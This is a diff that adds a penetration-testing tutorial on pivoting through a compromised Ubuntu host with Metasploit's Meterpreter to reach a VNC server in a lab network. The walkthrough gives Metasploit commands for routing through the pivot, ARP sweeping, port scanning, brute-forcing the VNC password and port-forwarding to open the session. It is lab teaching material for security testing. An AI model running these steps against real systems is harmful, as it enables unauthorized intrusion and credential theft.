@@ -1,0 +1,57 @@
+
+VNC Pivoting through Meterpreter
+
+In privous article we had describe VNC peneration testing and VNC tunneling through SSH but today we are going to demonstrate VNC pivoting.
+From Offensive Security
+Pivoting is technique to get inside an unreachable network with help of pivot (centre point). In simple words it is an attack through which attacker can exploit those system which belongs to different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then attacker will able to target the client system for attack.
+Lab Setup requirement:
+Attacker machine: Kali Linux
+Pivot Machine:  ubuntu operating system with two network interface
+Target Machine: ubuntu (Allow VNC service)
+
+Generate payload using msfvenom start multi/handler to hack the pivot machine (ubuntu) read complete article from here and bypass its UAC to achieve admin privileges.
+sessions
+ From given image you can confirm that I owned pivot machine (192.168.1.226) meterpreter session.
+
+Check network interface through following command:
+Meterpreter> ifconfig
+From given image you can observe two networks interface in pivot’s system 1st for IP 192.168.1.226 through which attacker is connected and 2nd for IP 10.0.0.1 through which VNC server (targets) are connected.
+
+Since attacker belongs to 192.168.1.1 interface and client belongs to 10.0.0.0interface therefore it is not possible to directly make attack on client network until unless the attacker acquires same network connection. In order to achieve 10.0.0.0 network attacker need run the post exploitation “autoroute”.
+use post/multi/manage/autoroute 
+msf post(autoroute) > set session 3
+msf post(autoroute) > exploit
+
+This module will enumerate alive Hosts in local network using ARP requests. Take help from target network interface 3 as shown above for MAC address and other details.
+ use auxiliary/scanner/discovery/arp_sweep
+msf auxiliary(arp_sweep) >set rhost 10.0.0.1-254
+msf auxiliary(arp_sweep) >set shost
+msf auxiliary(arp_sweep) >set smac 00:0c:29:bf:43:94
+msf auxiliary(arp_sweep) >run
+ Here we found a new host IP 10.0.0.20 as shown in given image. Let’s perform TCP port scan for activated services on this machine.
+
+This module will enumerate open TCP port of target system.
+use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) > set rhosts 10.0.0.20
+msf auxiliary(tcp) > set thread 10
+msf auxiliary(tcp) >exploit
+From given you can observe port 5900 is open and we know that 5900 used for VNC services.
+
+In order to steal password for making unauthorized access in VNC machine apply Brute force attack using password dictionary in given below exploit.
+use auxiliary/scanner/vnc/vnc_login
+msf auxiliary(vnc_login) >set rhosts 10.0.0.20
+msf auxiliary(vnc_login) >set pass_file /root/Desktop/pass.txt
+msf auxiliary(vnc_login) > run
+Awesome!! From given below image you can observe the same password: 123456 have been found by metasploit.
+
+Now Type following command for port forwarding on localhost.
+ Meterpreter> portfwd add –l  6000 –p 5900 –r 10.0.0.20
+-l: This is a local port to listen on.
+-p: The remote port to connect on.
+-r:  The remote host address to connect on.
+
+Now open the terminal and type following command to connect target machine:
+vncviewer 127.0.0.1:6000 
+Wonderful!! We had successfully exploit VNC client by making unauthorized access.
+
+Author: Sanjeet Kumar is a Information Security Analyst | Pentester | Researcher  Contact Here
